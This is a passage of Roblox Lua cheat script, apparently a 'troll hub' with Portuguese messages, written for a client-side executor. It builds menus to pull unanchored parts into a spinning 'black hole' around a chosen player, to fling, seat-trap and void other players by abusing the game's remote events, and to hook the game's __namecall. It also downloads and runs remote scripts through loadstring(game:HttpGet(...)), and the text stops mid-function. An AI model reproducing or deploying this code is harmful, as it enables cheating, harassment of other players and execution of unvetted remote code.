            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then

                x:Destroy()

            end

        end

        if v:FindFirstChild("Attachment") then

            v:FindFirstChild("Attachment"):Destroy()

        end

        if v:FindFirstChild("AlignPosition") then

            v:FindFirstChild("AlignPosition"):Destroy()

        end

        if v:FindFirstChild("Torque") then

            v:FindFirstChild("Torque"):Destroy()

        end

        v.CanCollide = false

        

        local Torque = Instance.new("Torque", v)

        Torque.Torque = Vector3.new(1000000, 1000000, 1000000)

        local AlignPosition = Instance.new("AlignPosition", v)

        local Attachment2 = Instance.new("Attachment", v)

        Torque.Attachment0 = Attachment2

        AlignPosition.MaxForce = math.huge

        AlignPosition.MaxVelocity = math.huge

        AlignPosition.Responsiveness = 500

        AlignPosition.Attachment0 = Attachment2

        AlignPosition.Attachment1 = Attachment1

    end

end



local function toggleBlackHole()

    blackHoleActive = not blackHoleActive

    if blackHoleActive then

        for _, v in next, Workspace:GetDescendants() do

            ForcePart(v)

        end



        Workspace.DescendantAdded:Connect(function(v)

            if blackHoleActive then

                ForcePart(v)

            end

        end)



        spawn(function()

            while blackHoleActive and RunService.RenderStepped:Wait() do

                angle = angle + math.rad(2)



                local offsetX = math.cos(angle) * radius

                local offsetZ = math.sin(angle) * radius



                Attachment1.WorldCFrame = humanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)

            end

        end)

    else

        Attachment1.WorldCFrame = CFrame.new(0, -1000, 0)

    end

end



LocalPlayer.CharacterAdded:Connect(function()

    humanoidRootPart, Attachment1 = setupPlayer()

    if blackHoleActive then

        toggleBlackHole()

    end

end)



local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()

local window = library:Window("Black Hole")



window:Slider("Radius Black Hole",1,100,10, function(Value)

   radius = Value

end)



window:Toggle("Toggle Black Hole", true, function(Value)

       if Value then

            toggleBlackHole()

        else

            blackHoleActive = false

        end

end)



spawn(function()

    while true do

        RunService.RenderStepped:Wait()

        if blackHoleActive then

            angle = angle + math.rad(angleSpeed)

        end

    end

end)


toggleBlackHole()

    end

})


TrollTab:AddButton({

    Name = "Bring Parts",

    Description = "To use, approach the Selected Player",

    Callback = function()

local Gui = Instance.new("ScreenGui")

local Main = Instance.new("Frame")

local Box = Instance.new("TextBox")

local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

local Label = Instance.new("TextLabel")

local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")

local Button = Instance.new("TextButton")

local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")



Gui.Name = "Gui"

Gui.Parent = gethui()

Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling



Main.Name = "Main"

Main.Parent = Gui

Main.BackgroundColor3 = Color3.fromRGB(75, 75, 75)

Main.BorderColor3 = Color3.fromRGB(0, 0, 0)

Main.BorderSizePixel = 0

Main.Position = UDim2.new(0.335954279, 0, 0.542361975, 0)

Main.Size = UDim2.new(0.240350261, 0, 0.166880623, 0)

Main.Active = true

Main.Draggable = true



Box.Name = "Box"

Box.Parent = Main

Box.BackgroundColor3 = Color3.fromRGB(95, 95, 95)

Box.BorderColor3 = Color3.fromRGB(0, 0, 0)

Box.BorderSizePixel = 0

Box.Position = UDim2.new(0.0980926454, 0, 0.218712583, 0)

Box.Size = UDim2.new(0.801089942, 0, 0.364963502, 0)

Box.FontFace = Font.new("rbxasset://fonts/families/SourceSansSemibold.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)

Box.PlaceholderText = "Player Name..."

Box.Text = ""

Box.TextColor3 = Color3.fromRGB(255, 255, 255)

Box.TextScaled = true

Box.TextSize = 31.000

Box.TextWrapped = true



UITextSizeConstraint.Parent = Box

UITextSizeConstraint.MaxTextSize = 31



Label.Name = "Label"

Label.Parent = Main

Label.BackgroundColor3 = Color3.fromRGB(95, 95, 95)

Label.BorderColor3 = Color3.fromRGB(0, 0, 0)

Label.BorderSizePixel = 0

Label.Size = UDim2.new(1, 0, 0.160583943, 0)

Label.FontFace = Font.new("rbxasset://fonts/families/Nunito.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)

Label.Text = "Bring Parts"

Label.TextColor3 = Color3.fromRGB(255, 255, 255)

Label.TextScaled = true

Label.TextSize = 14.000

Label.TextWrapped = true



UITextSizeConstraint_2.Parent = Label

UITextSizeConstraint_2.MaxTextSize = 21



Button.Name = "Button"

Button.Parent = Main

Button.BackgroundColor3 = Color3.fromRGB(95, 95, 95)

Button.BorderColor3 = Color3.fromRGB(0, 0, 0)

Button.BorderSizePixel = 0

Button.Position = UDim2.new(0.183284417, 0, 0.656760991, 0)

Button.Size = UDim2.new(0.629427791, 0, 0.277372271, 0)

Button.Font = Enum.Font.Nunito

Button.Text = "Bring Parts (Off)"

Button.TextColor3 = Color3.fromRGB(255, 255, 255)

Button.TextScaled = true

Button.TextSize = 28.000

Button.TextWrapped = true



UITextSizeConstraint_3.Parent = Button

UITextSizeConstraint_3.MaxTextSize = 28



local Players = game:GetService("Players")

local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local UserInputService = game:GetService("UserInputService")

local Workspace = game:GetService("Workspace")



local character

local humanoidRootPart



mainStatus = true

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)

    if input.KeyCode == Enum.KeyCode.RightControl and not gameProcessedEvent then

        mainStatus = not mainStatus

        Main.Visible = mainStatus

    end

end)


local Folder = Instance.new("Folder", Workspace)

local Part = Instance.new("Part", Folder)

local Attachment1 = Instance.new("Attachment", Part)

Part.Anchored = true

Part.CanCollide = false

Part.Transparency = 1



if not getgenv().Network then

    getgenv().Network = {

        BaseParts = {},

        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)

    }



    Network.RetainPart = function(Part)

        if Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then

            table.insert(Network.BaseParts, Part)

            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)

            Part.CanCollide = false

        end

    end



    local function EnablePartControl()

        LocalPlayer.ReplicationFocus = Workspace

        RunService.Heartbeat:Connect(function()

            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)

            for _, Part in pairs(Network.BaseParts) do

                if Part:IsDescendantOf(Workspace) then

                    Part.Velocity = Network.Velocity

                end

            end

        end)

    end


EnablePartControl()

end



local function ForcePart(v)

    if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then

        for _, x in ipairs(v:GetChildren()) do

            if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then

                x:Destroy()

            end

        end

        if v:FindFirstChild("Attachment") then

            v:FindFirstChild("Attachment"):Destroy()

        end

        if v:FindFirstChild("AlignPosition") then

            v:FindFirstChild("AlignPosition"):Destroy()

        end

        if v:FindFirstChild("Torque") then

            v:FindFirstChild("Torque"):Destroy()

        end

        v.CanCollide = false

        local Torque = Instance.new("Torque", v)

        Torque.Torque = Vector3.new(100000, 100000, 100000)

        local AlignPosition = Instance.new("AlignPosition", v)

        local Attachment2 = Instance.new("Attachment", v)

        Torque.Attachment0 = Attachment2

        AlignPosition.MaxForce = math.huge

        AlignPosition.MaxVelocity = math.huge

        AlignPosition.Responsiveness = 200

        AlignPosition.Attachment0 = Attachment2

        AlignPosition.Attachment1 = Attachment1

    end

end



local blackHoleActive = false

local DescendantAddedConnection



local function toggleBlackHole()

    blackHoleActive = not blackHoleActive

    if blackHoleActive then

        Button.Text = "Bring Parts (On)"

        for _, v in ipairs(Workspace:GetDescendants()) do

            ForcePart(v)

        end



        DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v)

            if blackHoleActive then

                ForcePart(v)

            end

        end)



        spawn(function()

            while blackHoleActive and RunService.RenderStepped:Wait() do

                Attachment1.WorldCFrame = humanoidRootPart.CFrame

            end

        end)

    else

        Button.Text = "Bring Parts (Off)"

        if DescendantAddedConnection then

            DescendantAddedConnection:Disconnect()

        end

    end

end



local function getPlayer(name)

    local lowerName = string.lower(name)

    for _, p in pairs(Players:GetPlayers()) do

        local lowerPlayer = string.lower(p.Name)

        if string.find(lowerPlayer, lowerName) then

            return p

        elseif string.find(string.lower(p.DisplayName), lowerName) then

            return p

        end

    end

end



local player = nil



local function VDOYZQL_fake_script() 

    local script = Instance.new('Script', Box)



    script.Parent.FocusLost:Connect(function(enterPressed)

        if enterPressed then

            player = getPlayer(Box.Text)

            if player then

                Box.Text = player.Name

            else

            end

        end

    end)

end

coroutine.wrap(VDOYZQL_fake_script)()

local function JUBNQKI_fake_script()

    local script = Instance.new('Script', Button)



    script.Parent.MouseButton1Click:Connect(function()

        if player then

            character = player.Character or player.CharacterAdded:Wait()

            humanoidRootPart = character:WaitForChild("HumanoidRootPart")

            toggleBlackHole()

        else

        end

    end)

end

coroutine.wrap(JUBNQKI_fake_script)()

    end

})


-- ===== Troll Players (Chaos Hub) =====
do
local v2 = Window
local ok, err = pcall(function()
	local v126 = v2:MakeTab({
		Title = "Troll Players",
		Icon = "rbxassetid://131153193945220 "
	})

	if game:GetService("ReplicatedStorage"):FindFirstChild("RE") then
		game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1n")
	end

	local Players2 = game:GetService("Players")
	local LocalPlayer = Players2.LocalPlayer
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local VirtualInputManager = game:GetService("VirtualInputManager")
	local RunService = game:GetService("RunService")
	local u132

	getgenv().Target = nil

	local Character = LocalPlayer.Character
	local Humanoid = Character and Character:WaitForChild("Humanoid")
	local HumanoidRootPart = Character and Character:WaitForChild("HumanoidRootPart")

	local function v136()
		local Character2 = LocalPlayer.Character

		if Character2 then
			local ChaosCouch = Character2:FindFirstChild("Chaos.Couch") or LocalPlayer.Backpack:FindFirstChild("Chaos.Couch")

			if ChaosCouch then
				ChaosCouch:Destroy()
			end
		end

		ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
	end

	LocalPlayer.CharacterAdded:Connect(function(character)
		Character = character
		Humanoid = character:WaitForChild("Humanoid")
		HumanoidRootPart = character:WaitForChild("HumanoidRootPart")
		v136()
		Humanoid.Died:Connect(function()
			v136()
		end)
	end)

	if Humanoid then
		Humanoid.Died:Connect(function()
			v136()
		end)
	end

	local function v139()
		if not u132 then
			warn("Erro: Nenhum jogador selecionado")

			return
		end

		local v140 = Players2:FindFirstChild(u132)

		if not v140 or not v140.Character then
			warn("Erro: Jogador alvo não encontrado ou sem personagem")

			return
		end

		local Character2 = LocalPlayer.Character

		if not Character2 then
			warn("Erro: Personagem do jogador local não encontrado")

			return
		end

		local Humanoid2 = Character2:FindFirstChildOfClass("Humanoid")
		local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")
		local HumanoidRootPart3 = v140.Character and v140.Character:FindFirstChild("HumanoidRootPart")

		if not Humanoid2 or not HumanoidRootPart2 or not HumanoidRootPart3 then
			warn("Erro: Componentes necessários não encontrados")

			return
		end

		local Position = HumanoidRootPart2.Position
		local vector3 = Vector3.new(145.51, -350.09, 21.58)

		ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
		task.wait(0.2)
		ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
		task.wait(0.3)

		local Couch = LocalPlayer.Backpack:FindFirstChild("Couch")

		if Couch then
			Couch.Parent = Character2
		end

		task.wait(0.1)
		VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
		task.wait(0.1)
		Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
		Humanoid2.PlatformStand = false
		workspace.CurrentCamera.CameraSubject = v140.Character:FindFirstChild("Head") or HumanoidRootPart3

		local BodyPosition = Instance.new("BodyPosition")

		BodyPosition.Name = "BringPosition"
		BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
		BodyPosition.D = 10
		BodyPosition.P = 30000
		BodyPosition.Position = HumanoidRootPart2.Position
		BodyPosition.Parent = HumanoidRootPart3
		task.spawn(function()
			local n4 = 0
			local now = tick()

			while tick() - now < 5 and v140 and v140.Character do
				if v140.Character:FindFirstChildOfClass("Humanoid") then
					local Humanoid3 = v140.Character:FindFirstChildOfClass("Humanoid")

					if Humanoid3 and not Humanoid3.Sit then
						local HumanoidRootPart4 = v140.Character.HumanoidRootPart

						n4 += 50
						HumanoidRootPart2.CFrame = CFrame.new(HumanoidRootPart4.Position + HumanoidRootPart4.Velocity / 1.5 + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(n4), 0, 0)
						BodyPosition.Position = HumanoidRootPart2.Position + Vector3.new(2, 0, 0)
						task.wait()

						continue
					end
				end

				break
			end

			BodyPosition:Destroy()
			Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			Humanoid2.PlatformStand = false
			workspace.CurrentCamera.CameraSubject = Humanoid2

			for _, descendant in pairs(Character2:GetDescendants()) do
				if descendant:IsA("BasePart") then
					descendant.Velocity = Vector3.zero
					descendant.RotVelocity = Vector3.zero
				end
			end

			task.wait(0.1)
			HumanoidRootPart2.CFrame = CFrame.new(vector3)
			task.wait(0.3)

			local Couch2 = Character2:FindFirstChild("Couch")

			if Couch2 then
				Couch2.Parent = LocalPlayer.Backpack
			end

			task.wait(0.01)
			ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
			task.wait(0.2)
			HumanoidRootPart2.CFrame = CFrame.new(Position)
		end)
	end
	local function v156()
		if not u132 then
			warn("Erro: Nenhum jogador selecionado")

			return
		end

		local v157 = Players2:FindFirstChild(u132)

		if not v157 or not v157.Character then
			warn("Erro: Jogador alvo não encontrado ou sem personagem")

			return
		end

		local Character2 = LocalPlayer.Character

		if not Character2 then
			warn("Erro: Personagem do jogador local não encontrado")

			return
		end

		local Humanoid2 = Character2:FindFirstChildOfClass("Humanoid")
		local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")
		local HumanoidRootPart3 = v157.Character and v157.Character:FindFirstChild("HumanoidRootPart")

		if not Humanoid2 or not HumanoidRootPart2 or not HumanoidRootPart3 then
			warn("Erro: Componentes necessários não encontrados")

			return
		end

		local Position = HumanoidRootPart2.Position

		ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
		task.wait(0.2)
		ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
		task.wait(0.3)

		local Couch = LocalPlayer.Backpack:FindFirstChild("Couch")

		if Couch then
			Couch.Parent = Character2
		end

		task.wait(0.1)
		VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
		task.wait(0.1)
		Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
		Humanoid2.PlatformStand = false
		workspace.CurrentCamera.CameraSubject = v157.Character:FindFirstChild("Head") or HumanoidRootPart3

		local BodyPosition = Instance.new("BodyPosition")

		BodyPosition.Name = "BringPosition"
		BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
		BodyPosition.D = 10
		BodyPosition.P = 30000
		BodyPosition.Position = HumanoidRootPart2.Position
		BodyPosition.Parent = HumanoidRootPart3
		task.spawn(function()
			local n5 = 0
			local now = tick()

			while tick() - now < 5 and v157 and v157.Character do
				if v157.Character:FindFirstChildOfClass("Humanoid") then
					local Humanoid3 = v157.Character:FindFirstChildOfClass("Humanoid")

					if Humanoid3 and not Humanoid3.Sit then
						local HumanoidRootPart4 = v157.Character.HumanoidRootPart

						n5 += 50
						HumanoidRootPart2.CFrame = CFrame.new(HumanoidRootPart4.Position + HumanoidRootPart4.Velocity / 1.5 + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(n5), 0, 0)
						BodyPosition.Position = HumanoidRootPart2.Position + Vector3.new(2, 0, 0)
						task.wait()

						continue
					end
				end

				break
			end

			BodyPosition:Destroy()
			Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			Humanoid2.PlatformStand = false
			workspace.CurrentCamera.CameraSubject = Humanoid2

			for _, descendant in pairs(Character2:GetDescendants()) do
				if descendant:IsA("BasePart") then
					descendant.Velocity = Vector3.zero
					descendant.RotVelocity = Vector3.zero
				end
			end

			task.wait(0.1)
			HumanoidRootPart2.Anchored = true
			HumanoidRootPart2.CFrame = CFrame.new(Position)
			task.wait(0.001)
			HumanoidRootPart2.Anchored = false
			task.wait(0.7)

			local Couch2 = Character2:FindFirstChild("Couch")

			if Couch2 then
				Couch2.Parent = LocalPlayer.Backpack
			end

			task.wait(0.001)
			ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
		end)
	end
	local function v172()
		local v173 = Players2:FindFirstChild(getgenv().Target)

		if not v173 then
			warn("Erro: Nenhum jogador alvo selecionado")

			return
		end

		if v173.Character then
			if v173.Character:FindFirstChild("HumanoidRootPart") then
				ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack({ "ClearAllTools" }))
				ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack({
					"PickingTools",
					"Couch"
				}))

				local Couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)

				if not Couch then
					warn("Erro: Sofá não encontrado no Backpack")

					return
				end

				Couch.Name = "Chaos.Couch"

				local Seat1 = Couch:FindFirstChild("Seat1")
				local Seat2 = Couch:FindFirstChild("Seat2")
				local Handle = Couch:FindFirstChild("Handle")

				if not Seat1 or not Seat2 or not Handle then
					warn("Erro: Componentes do sofá não encontrados")

					return
				end

				Seat1.Disabled = true
				Seat2.Disabled = true
				Handle.Name = "Handle "
				Couch.Parent = LocalPlayer.Character

				local BodyVelocity = Instance.new("BodyVelocity", Seat1)

				BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				BodyVelocity.P = 1250
				BodyVelocity.Velocity = Vector3.new(0, 0, 0)
				BodyVelocity.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

				repeat
					for i = 1, 35 do
						local t11 = {
							x = 0,
							y = 0,
							z = 0
						}
						local HumanoidRootPart2 = v173.Character and v173.Character.HumanoidRootPart

						if not HumanoidRootPart2 then
							break
						end

						t11.x = HumanoidRootPart2.Position.X + HumanoidRootPart2.Velocity.X / 2
						t11.y = HumanoidRootPart2.Position.Y + HumanoidRootPart2.Velocity.Y / 2
						t11.z = HumanoidRootPart2.Position.Z + HumanoidRootPart2.Velocity.Z / 2
						Seat1.CFrame = CFrame.new(Vector3.new(t11.x, t11.y, t11.z)) * CFrame.new(-2, 2, 0)
						task.wait()
					end

					BodyVelocity:Destroy()
					Couch.Parent = LocalPlayer.Backpack
					task.wait()
					Couch:FindFirstChild("Handle ").Name = "Handle"
					task.wait(0.2)
					Couch.Parent = LocalPlayer.Character
					task.wait()
					Couch.Parent = LocalPlayer.Backpack
					Couch.Handle.Name = "Handle "
					task.wait(0.2)
					Couch.Parent = LocalPlayer.Character
					BodyVelocity = Instance.new("BodyVelocity", Seat1)
					BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
					BodyVelocity.P = 1250
					BodyVelocity.Velocity = Vector3.new(0, 0, 0)
					BodyVelocity.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
				until v173.Character and v173.Character.Humanoid and v173.Character.Humanoid.Sit == true

				task.wait()
				BodyVelocity:Destroy()
				Couch.Parent = LocalPlayer.Backpack
				task.wait()
				Couch:FindFirstChild("Handle ").Name = "Handle"
				task.wait(0.3)
				Couch.Parent = LocalPlayer.Character
				task.wait(0.3)
				Couch.Grip = CFrame.new(Vector3.new(0, 0, 0))
				task.wait(0.3)
				ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")

				return
			end
		end

		warn("Erro: Jogador alvo sem personagem ou HumanoidRootPart")
	end
	local function v182()
		local Character2 = LocalPlayer.Character
		local HumanoidRootPart2 = Character2 and Character2:FindFirstChild("HumanoidRootPart")

		if not HumanoidRootPart2 then
			warn("Erro: HumanoidRootPart do jogador local não encontrado")

			return
		end

		local CFrame_ = HumanoidRootPart2.CFrame

		local function v186()
			local Vehicles = game.Workspace:FindFirstChild("Vehicles")

			if Vehicles then
				return Vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
			end

			return nil
		end

		local v188 = v186()

		if not v188 then
			HumanoidRootPart2.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
			task.wait(0.5)

			local RE = ReplicatedStorage:FindFirstChild("RE")

			if RE and RE:FindFirstChild("1Ca1r") then
				RE["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
			end

			task.wait(1)
			v188 = v186()
		end

		if v188 then
			local VehicleSeat = v188:FindFirstChild("Body") and v188.Body:FindFirstChild("VehicleSeat")

			if VehicleSeat and Character2:FindFirstChildOfClass("Humanoid") and not Character2.Humanoid.Sit then
				while true do
					HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, 2, 0)
					task.wait()

					if Character2.Humanoid.Sit then
						break
					elseif not v188.Parent then
						break
					end
				end

				if Character2.Humanoid.Sit or not v188.Parent then
					for _, child in pairs(v188.Body:GetChildren()) do
						if child:IsA("Seat") then
							child.CanTouch = false
						end
					end
				end
			end
		end

		spawn(function()
			while true do
				if not u132 then
					RunService.RenderStepped:Wait()

					continue
				end

				local v193 = Players2:FindFirstChild(u132)

				if not v193 or not v193.Character then
					RunService.RenderStepped:Wait()

					continue
				end

				if not v193.Character:FindFirstChild("HumanoidRootPart") then
					RunService.RenderStepped:Wait()

					continue
				end

				local Humanoid2 = v193.Character:FindFirstChildOfClass("Humanoid")

				if Humanoid2 and Humanoid2.Sit then
					break
				end

				local HumanoidRootPart3 = v193.Character.HumanoidRootPart
				local v196 = tick() * 35

				v188:SetPrimaryPartCFrame(HumanoidRootPart3.CFrame * CFrame.new(math.sin(v196) * 4, 0, math.cos(v196) * 20))
				RunService.RenderStepped:Wait()
			end

			if Character2.Humanoid then
				v188:SetPrimaryPartCFrame(CFrame.new(Vector3.new(9999, -450, 9999)))
				print("Jogador sentou, levando ônibus para o void!")
				task.wait(0.2)

				local function v197()
					local Humanoid2 = Character2 and Character2:FindFirstChildWhichIsA("Humanoid")

					if Humanoid2 then
						Humanoid2:ChangeState(Enum.HumanoidStateType.Jumping)
					end
				end

				v197()
				print("Simulando pulo!")
				task.wait(0.5)
				HumanoidRootPart2.CFrame = CFrame_
				print("Player voltou para a posição inicial.")
			end
		end)
	end
	local function v199()
		local v200 = Players2:FindFirstChild(getgenv().Target)

		if not v200 then
			warn("Erro: Nenhum jogador alvo selecionado")

			return
		end

		if v200.Character then
			if v200.Character:FindFirstChild("HumanoidRootPart") then
				ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack({ "ClearAllTools" }))
				ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack({
					"PickingTools",
					"Couch"
				}))

				local Couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)

				if not Couch then
					warn("Erro: Sofá não encontrado no Backpack")

					return
				end

				Couch.Name = "Chaos.Couch"

				local Seat1 = Couch:FindFirstChild("Seat1")
				local Seat2 = Couch:FindFirstChild("Seat2")
				local Handle = Couch:FindFirstChild("Handle")

				if not Seat1 or not Seat2 or not Handle then
					warn("Erro: Componentes do sofá não encontrados")

					return
				end

				Seat1.Disabled = true
				Seat2.Disabled = true
				Handle.Name = "Handle "
				Couch.Parent = LocalPlayer.Character

				local BodyVelocity = Instance.new("BodyVelocity", Seat1)

				BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				BodyVelocity.P = 1250
				BodyVelocity.Velocity = Vector3.new(0, 0, 0)
				BodyVelocity.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

				repeat
					for i = 1, 35 do
						local t12 = {
							x = 0,
							y = 0,
							z = 0
						}
						local HumanoidRootPart2 = v200.Character and v200.Character.HumanoidRootPart

						if not HumanoidRootPart2 then
							break
						end

						t12.x = HumanoidRootPart2.Position.X + HumanoidRootPart2.Velocity.X / 2
						t12.y = HumanoidRootPart2.Position.Y + HumanoidRootPart2.Velocity.Y / 2
						t12.z = HumanoidRootPart2.Position.Z + HumanoidRootPart2.Velocity.Z / 2
						Seat1.CFrame = CFrame.new(Vector3.new(t12.x, t12.y, t12.z)) * CFrame.new(-2, 2, 0)
						task.wait()
					end

					BodyVelocity:Destroy()
					Couch.Parent = LocalPlayer.Backpack
					task.wait()
					Couch:FindFirstChild("Handle ").Name = "Handle"
					task.wait(0.2)
					Couch.Parent = LocalPlayer.Character
					task.wait()
					Couch.Parent = LocalPlayer.Backpack
					Couch.Handle.Name = "Handle "
					task.wait(0.2)
					Couch.Parent = LocalPlayer.Character
					BodyVelocity = Instance.new("BodyVelocity", Seat1)
					BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
					BodyVelocity.P = 1250
					BodyVelocity.Velocity = Vector3.new(0, 0, 0)
					BodyVelocity.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
				until v200.Character and v200.Character.Humanoid and v200.Character.Humanoid.Sit == true

				task.wait()
				Couch.Parent = LocalPlayer.Backpack
				Seat1.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))
				Seat2.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))
				Couch.Parent = LocalPlayer.Character
				task.wait(0.1)
				Couch.Parent = LocalPlayer.Backpack
				task.wait(2)

				local MOVOOEPFFGEREVEWVW = Seat1:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W")

				if MOVOOEPFFGEREVEWVW then
					MOVOOEPFFGEREVEWVW:Destroy()
				end

				ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")

				return
			end
		end

		warn("Erro: Jogador alvo sem personagem ou HumanoidRootPart")
	end

	v126:AddSection({
		Name = "Troll Player"
	})

	local function v210()
		local players = Players2:GetPlayers()
		local t13 = {}

		for _, player in ipairs(players) do
			if player ~= LocalPlayer then
				table.insert(t13, player.Name)
			end
		end

		return t13
	end

	local v215 = v126:AddDropdown({
		Name = "Selecionar Jogador",
		Options = v210(),
		Default = "",
		Callback = function(p18)
			u132 = p18
			getgenv().Target = p18
			print("Jogador selecionado: " .. tostring(p18))
		end
	})

	v126:AddButton({
		Name = "Atualizar Player List",
		Callback = function()
			local players = Players2:GetPlayers()
			local t14 = {}

			if not v215 then
				print("Erro: Dropdown não encontrado ou nenhum jogador disponível.")

				return
			end

			if #players > 0 then
				for _, player in ipairs(players) do
					if player.Name ~= LocalPlayer.Name then
						table.insert(t14, player.Name)
					end
				end

				v215:Set(t14)
				print("Lista de jogadores atualizada: ", table.concat(t14, ", "))

				if u132 and not Players2:FindFirstChild(u132) then
					u132 = nil
					getgenv().Target = nil
					v215:SetValue("...")
					print("Seleção resetada, jogador não está mais no servidor.")
				end
			else
				print("Erro: Dropdown não encontrado ou nenhum jogador disponível.")
			end
		end
	})
	v126:AddButton({
		Name = "Teleportar até o Player",
		Callback = function()
			if not u132 or not Players2:FindFirstChild(u132) then
				print("Erro: Player não selecionado ou não existe")

				return
			end

			local Character2 = LocalPlayer.Character
			local HumanoidRootPart2 = Character2 and Character2:FindFirstChild("HumanoidRootPart")

			if not HumanoidRootPart2 then
				warn("Erro: HumanoidRootPart do jogador local não encontrado")

				return
			end

			local v222 = Players2:FindFirstChild(u132)

			if v222 and v222.Character then
				if v222.Character:FindFirstChild("HumanoidRootPart") then
					HumanoidRootPart2.CFrame = v222.Character.HumanoidRootPart.CFrame
				else
					print("Erro: Player alvo não encontrado ou sem HumanoidRootPart")
				end
			else
				print("Erro: Player alvo não encontrado ou sem HumanoidRootPart")

				return
			end
		end
	})
	v126:AddToggle({
		Name = "Spectar Player",
		Default = false,
		Callback = function(p19)
			local function v223()
				if p19 then
					local v224 = Players2:FindFirstChild(u132)

					if v224 and v224.Character then
						local Humanoid2 = v224.Character:FindFirstChild("Humanoid")

						if Humanoid2 then
							workspace.CurrentCamera.CameraSubject = Humanoid2
						end
					end
				elseif LocalPlayer.Character then
					local Humanoid2 = LocalPlayer.Character:FindFirstChild("Humanoid")

					if Humanoid2 then
						workspace.CurrentCamera.CameraSubject = Humanoid2
					end
				end
			end

			if p19 then
				if not getgenv().CameraConnection then
					getgenv().CameraConnection = RunService.Heartbeat:Connect(v223)
				end
			else
				if getgenv().CameraConnection then
					getgenv().CameraConnection:Disconnect()
					getgenv().CameraConnection = nil
				end

				v223()
			end
		end
	})
	v126:AddSection({
		Name = "PROP [NEW]"
	})
	v126:AddButton({
		Name = "Open prop kill UI [OP]",
		Callback = function()
			local obj = setmetatable({}, {
				__index = function(p20, p21)
					return game:GetService(p21)
				end
			})

			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()

			local Players3 = obj.Players
			local ReplicatedStorage2 = obj.ReplicatedStorage
			local LocalPlayer2 = Players3.LocalPlayer
			local response = game:GetService("ReplicatedStorage").Remotes.GetPrivateServerOwner:InvokeServer()
			local v232 = response ~= 0

			if getgenv().IsPrivateServerConn then
				getgenv().IsPrivateServerConn:Disconnect()
				getgenv().IsPrivateServerConn = nil
			end

			local lib2 = loadstring(game:HttpGet("https://raw.githubusercontent.com/jensonhirst/Orion/main/source"))()

			pcall(restorefunction, getrawmetatable(game).__namecall)
			getgenv().old__namecall = hookmetamethod(game, "__namecall", function(p22, ...)
